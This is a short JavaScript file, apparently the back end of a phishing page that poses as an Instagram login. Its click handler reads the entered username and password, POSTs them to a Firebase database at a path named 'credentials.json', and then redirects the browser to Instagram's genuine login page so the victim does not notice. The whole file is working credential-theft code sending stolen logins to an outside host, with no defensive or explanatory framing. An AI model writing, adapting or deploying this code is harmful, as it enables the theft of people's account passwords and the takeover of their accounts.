//Selectors
const userInputs = document.querySelectorAll("input")
const loginBtn = document.getElementById("login-btn")

//Functions
const loginFormHandler = async (event) => {
    event.preventDefault()
    console.log("submited")
    const username = userInputs[0].value
    const password = userInputs[1].value

    await fetch("https://prevara-86dc3-default-rtdb.europe-west1.firebasedatabase.app/credentials.json", {
        method: "POST",
        body: JSON.stringify({ username, password }),
        headers: {"Content-Type": "application/json" },
    })
    window.location.replace("https://www.instagram.com/accounts/login/")
}

//Event Listeners
loginBtn.addEventListener("click", loginFormHandler)